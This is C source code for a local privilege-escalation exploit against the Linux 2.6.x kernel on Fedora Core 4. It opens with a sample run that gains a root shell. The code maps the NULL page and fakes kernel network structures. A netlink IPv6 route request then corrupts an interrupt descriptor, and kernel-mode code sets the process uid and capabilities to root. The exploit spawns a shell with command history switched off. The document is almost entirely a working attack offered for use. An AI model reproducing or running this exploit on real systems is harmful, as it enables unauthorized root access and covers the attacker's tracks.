/* Fedora Core release 4 local root exploit by eSDee (esdee@promisc.org) */

/*
Exploitation example:
[!] Linux 2.6.x local root exploit by eSDee (esdee@promisc.org)
 -  Current uid/gid    : 500/500
 -  IDT base address   : 0xc041f000
 -  inet6_dev offset   : 0x00000088
 -  CPL0 trampoline    : 0x10000000
 -  hook irq off2      : 0xc041f01f

[!] Exploiting vulnerability...
 -  Triggering modified interrupt...

[!] uid/gid changed from 500/500 to 0/0!

sh-3.00# id
uid=0(root) gid=0(root) groups=500(esdee) context=user_u:system_r:unconfined_t
sh-3.00#

*/

#define DUMMY_VAL                       0xbade5dee
#define THREAD_SIZE                     4096
#define MAGIC_UID                       0x69
#define _LINUX_CAPABILITY_VERSION       0x19980330
#define SIZE_TRAMPOLINE                 8
#define HOOK_IRQ                        0x3
#define MSB_IRQ                         0xc0
#define OFFSET                          120

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <netinet/in.h>
#include <asm/types.h>

#define DUMMY_VAL                       0xbade5dee
#define THREAD_SIZE                     4096
#define MAGIC_UID                       0x69
#define _LINUX_CAPABILITY_VERSION       0x19980330
#define SIZE_TRAMPOLINE                 8
#define HOOK_IRQ                        0x3
#define MSB_IRQ                         0xc0
#define OFFSET                          120

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <netinet/in.h>
#include <asm/types.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/capability.h>

extern int k_trampoline;
__asm__ (
        " k_trampoline:             \n"
        " pusha;                    \n"
        " movl  $kernel_code, %eax; \n"
        " jmpl  *%eax;              \n");

extern int kernel_code;
__asm__ (
        " kernel_code:             \n"
        " movl  $-8192, %eax;      \n"
        " andl  %esp, %eax;        \n"
        " pushl (%eax);            \n"
        " call  modify_task;       \n"
        " popl  %eax;              \n"
        " popa;                    \n"
        " iret;                    \n");


struct idtr idt;
struct descriptor *igd;

struct idtr {
        unsigned short limit;
        unsigned int base;
} __attribute__ ((packed));

unsigned int hook_irq_off2      = 0;
unsigned int addr_inet6_ifaddr  = 0;
unsigned int offset             = 0;

int capget(cap_user_header_t header, cap_user_data_t data);
int capset(cap_user_header_t header, const cap_user_data_t data);

int setresuid(uid_t ruid, uid_t euid, uid_t suid);
int setresgid(gid_t rgid, gid_t egid, gid_t sgid);

uid_t uid,euid;
gid_t gid,egid;

unsigned int *
current_thread_info(void)
{
        /* Returns a pointer to thread_info. */

        unsigned int *ti = NULL;

        __asm__("andl %%esp,%0; ":"=r" (ti) : "0" (~(THREAD_SIZE - 1)));

        return ti;
}

unsigned int *
get_current(void)
{
        /* Returns current_thread_info->task. */

        unsigned int *thread_info = current_thread_info();

        if (!thread_info) {
                fprintf(stderr, "CPL0 execution: Invalid thread_info.\r\n");
                exit(EXIT_FAILURE);
        }

        return (unsigned int *)*thread_info;
}

void
modify_task(void)
{
        static struct __user_cap_header_struct  cap_head;
        static struct __user_cap_data_struct    cap_data_new;

        unsigned int i                  = 0;
        unsigned int found              = 0;

        unsigned int *task_struct       = get_current();

        unsigned char *irq_gate         = (unsigned char *)hook_irq_off2;

        *(irq_gate) = MSB_IRQ;

        if (!task_struct) {
                fprintf(stderr, "CPL0 execution: invalid task_struct!\r\n");
                exit(EXIT_FAILURE);
        }

        for(i = 0; i <= 4095; i++, task_struct++) {

                if (    (task_struct[0] == uid) && (task_struct[1] == euid) &&
                        (task_struct[4] == gid) && (task_struct[5] == egid)) {

                        task_struct[0] = MAGIC_UID;

                        if (getuid() == MAGIC_UID) {

                                /* Set uid/gid. */

                                task_struct[0] = 0;             // uid

                                /* Set capabilities. */

                                task_struct[11] = -1;           // permitted

                                found = 1;

                                break;
                        } else {

                                /* Eek... We've modified a wrong value! */

                                task_struct[0] = uid;
                        }
                }
        }

        if (!found) {
                fprintf(stderr, "CPL0 execution: uid/gid not found!\r\n");
                exit(EXIT_FAILURE);
        }

        setresuid(0, 0, 0);
        setresgid(0, 0, 0);

        cap_head.version                = _LINUX_CAPABILITY_VERSION;
        cap_head.pid                    = 0;

        cap_data_new.effective          = -1;
        cap_data_new.permitted          = -1;
        cap_data_new.inheritable        = -1;

        if (capset(&cap_head, &cap_data_new) < 0) {
                fprintf(stderr, "CPL0 execution: capset failed!\r\n");
                exit(EXIT_FAILURE);
        }

        return;
}



void
addattr_l(struct nlmsghdr *n, int maxlen, int type, void *data, int alen)
{
        struct rtattr *rta;

        int len = RTA_LENGTH(alen);

        if (NLMSG_ALIGN(n->nlmsg_len) + len > maxlen) {
                fprintf(stderr, "addattr_l: len is too big.\r\n");
                exit(EXIT_FAILURE);
        }

        rta = (struct rtattr*)(((char*)n) + NLMSG_ALIGN(n->nlmsg_len));
        rta->rta_type = type;
        rta->rta_len = len;

        memcpy(RTA_DATA(rta), data, alen);
        n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + len;

        return;
}

int
netlink_get_socket(void)
{
        struct sockaddr_nl      sa_nl;

        int fd = 0;

        if ((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE)) < 0) {
                perror("socket");
                exit(EXIT_FAILURE);
        }

        memset(&sa_nl,  '\0', sizeof(struct sockaddr_nl));

        sa_nl.nl_family = PF_NETLINK;
        sa_nl.nl_groups = 0;

        if (bind(fd, (struct sockaddr*)&sa_nl, sizeof(struct sockaddr_nl)) < 0) {
                perror("bind");
                exit(EXIT_FAILURE);
        }

        return fd;
}

int
netlink_send_getroute_request(int fd)
{
        int ret = 0;

        struct sockaddr_nl      sa_nl;
        struct msghdr           mh;
        struct iovec            iov;

        struct {
                struct nlmsghdr     nl_msg;
                struct rtmsg        rt_msg;
                unsigned char     buf[1024];
        } request;

        memset(&sa_nl,   '\0',  sizeof(struct sockaddr_nl));
        memset(&mh,      '\0',  sizeof(struct msghdr));
        memset(&iov,     '\0',  sizeof(struct iovec));
        memset(&request, '\0',  sizeof(request));

        sa_nl.nl_family         = AF_NETLINK;

        request.nl_msg.nlmsg_len        = NLMSG_LENGTH(sizeof(struct rtmsg));
        request.nl_msg.nlmsg_flags      = NLM_F_REQUEST;
        request.nl_msg.nlmsg_type       = RTM_GETROUTE;
        request.rt_msg.rtm_family       = AF_INET6;
        request.rt_msg.rtm_table        = 0;
        request.rt_msg.rtm_protocol     = 0;
        request.rt_msg.rtm_scope        = 0;
        request.rt_msg.rtm_type         = 0;
        request.rt_msg.rtm_src_len      = 0;
        request.rt_msg.rtm_dst_len      = 0;
        request.rt_msg.rtm_tos          = 0;

        addattr_l(&request.nl_msg, sizeof(request), RTA_DST, "flopflopflopflop", 16);

        mh.msg_name             = (void *)&sa_nl;
        mh.msg_namelen          = sizeof(struct sockaddr_nl);
        mh.msg_iov              = &iov;
        mh.msg_iovlen           = 1;
        mh.msg_control          = NULL;
        mh.msg_controllen       = 0;
        mh.msg_flags            = 0;


        iov.iov_base = &request.nl_msg;
        iov.iov_len  = request.nl_msg.nlmsg_len;

        if ((ret = sendmsg(fd, &mh, 0)) < 0) {
                perror("sendmsg");
                exit(EXIT_FAILURE);
        }

        return ret;
}

void
mem_map_null_page(void)
{
        unsigned int page_size  = getpagesize();

        if (    mmap(   NULL,
                        page_size,
                        PROT_READ|PROT_WRITE|PROT_EXEC,
                        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,
                        -1,
                        0       ) != (void *)NULL) {

                fprintf(stderr, "mem_map_null_page: Unable to map NULL page.\r\n");
                exit(EXIT_FAILURE);
        }

        return;
}

unsigned int
mem_get_page(unsigned int num_pages)
{
        unsigned int page_size  = getpagesize();
        unsigned int ret        = 0;


        ret = (unsigned int) mmap(NULL, num_pages * page_size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

        if ((void *)ret == MAP_FAILED) {
                perror("mmap");
                exit(EXIT_FAILURE);
        }

        return ret;
}

unsigned int
mem_setup_trampoline()
{
        unsigned int trampoline = 0;

        trampoline =  (unsigned int) mmap(      (void *)0x10000000,
                                                0x01000000,
                                                PROT_READ|PROT_WRITE|PROT_EXEC,
                                                MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,
                                                -1,
                                                0);

        if ((void *)trampoline == MAP_FAILED) {
                perror("mmap");
                exit(EXIT_FAILURE);
        }

        memset((void *)trampoline, 0x90, 0x01000000);
        memcpy((void *)(trampoline + (0x01000000 - SIZE_TRAMPOLINE)), &k_trampoline, SIZE_TRAMPOLINE);

        return trampoline;
}

void
mem_fill_page(unsigned int addr_write, unsigned int value)
{
        unsigned int i          = 0;
        unsigned int page_size  = getpagesize();

        for (i = 0; i < page_size; i += 4)
               memcpy((void *)(addr_write + i), &value, 4);

        return;
}

void
mem_setup()
{
        unsigned int addr_rt61_idev     = 0;
        unsigned int addr_net_device    = mem_get_page(1);
        unsigned int addr_inet6_dev     = mem_get_page(1);

        addr_inet6_ifaddr = mem_get_page(1);

        /* rt6i_idev.dev:
        ** rt61_idev is NULL; we mmap() this address and we supply a fake net_device pointer.
        */

        mem_map_null_page();
        memcpy((void *)addr_rt61_idev, &addr_net_device, 4);

        /* net_device->ip6_ptr
        ** The net_device structure contains a pointer to a inet6_dev structure.
        */

        mem_fill_page(addr_net_device, addr_inet6_dev);

        /* inet6_dev->inet6_ifaddr:
        */

        mem_fill_page(addr_inet6_dev, addr_inet6_ifaddr);

        return;
}

void
mem_set_address(unsigned int address)
{
        memset((void *)addr_inet6_ifaddr, '\0', 4096);
        memcpy((void *)addr_inet6_ifaddr + OFFSET, &address, 4);

        return;
}

unsigned int
find_offset()
{
        unsigned char vector[1024];
        unsigned int off = 0;

        int fd  = netlink_get_socket();

        for (off = 0; off < (sizeof(vector) / sizeof(unsigned char)); off++)
                vector[off] = (DUMMY_VAL >> 24) & 0xff;

        mem_set_address((unsigned int)&vector);

        netlink_send_getroute_request(fd);

        for (off = 0; off < (sizeof(vector) / sizeof(unsigned char)); off++) {

                if (vector[off] == (((DUMMY_VAL >> 24) & 0xff) - 1)) {
                        close(fd);
                        return off;
                }
        }

        fprintf(stdout, "[!] Offset not found.\r\n");
        close(fd);
        exit(EXIT_FAILURE);
}

void
open_shell(void)
{
        char *envp[] = {        "TERM=vt100",
                                "SHELL=/bin/sh",
                                "HISTFILE=/dev/null",
                                "HISTFILESIZE=0",
                                "HISTSIZE=1000",
                                "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:",
                                NULL };

        char *argv[] = {        "/bin/sh",
                                NULL };

        execve(argv[0], argv, envp);
        _exit(EXIT_FAILURE);
}

void
decrement_address(unsigned int address, unsigned times)
{
        int fd = netlink_get_socket();

        mem_set_address(address - offset);

        while(times--) {
                netlink_send_getroute_request(fd);
        }

        close(fd);

        return;
}

int
main(void)
{
        unsigned int trampoline         = 0;

        uid = getuid(); euid = geteuid();
        gid = getgid(); egid = getegid();

        __asm__ ("sidt %0" : "=m" (idt));

        mem_setup();

        fprintf(stdout, "[!] Linux 2.6.x local root exploit by eSDee (esdee@promisc.org)\r\n"
                        " -  Current uid/gid    : %u/%u\r\n"
                        " -  IDT base address   : 0x%08x\r\n", uid, gid, idt.base);

        offset = find_offset();

        fprintf(stdout, " -  inet6_dev offset   : 0x%08x\r\n", offset);

        trampoline = mem_setup_trampoline();

        fprintf(stdout, " -  CPL0 trampoline    : 0x%08x\r\n", trampoline);

        hook_irq_off2 = idt.base + (HOOK_IRQ * 8) + 7;

        fprintf(stdout, " -  hook irq off2      : 0x%08x\r\n\r\n"
                        "[!] Exploiting vulnerability...\r\n", hook_irq_off2);

        decrement_address(hook_irq_off2, MSB_IRQ - ((trampoline >> 24) & 0xff));

        fprintf(stdout, " -  Triggering modified interrupt...\r\n");

        __asm("int $0x3");

        if ((getuid() == 0) && (getgid() == 0)) {
                fprintf(stdout, "\r\n[!] uid/gid changed from %u/%u to %u/%u!\r\n\r\n", uid, gid, getuid(), getgid());
                open_shell();
                exit(EXIT_SUCCESS);
        }

        fprintf(stdout, "[!] Exploit failed.\r\n");

        return 0;
}
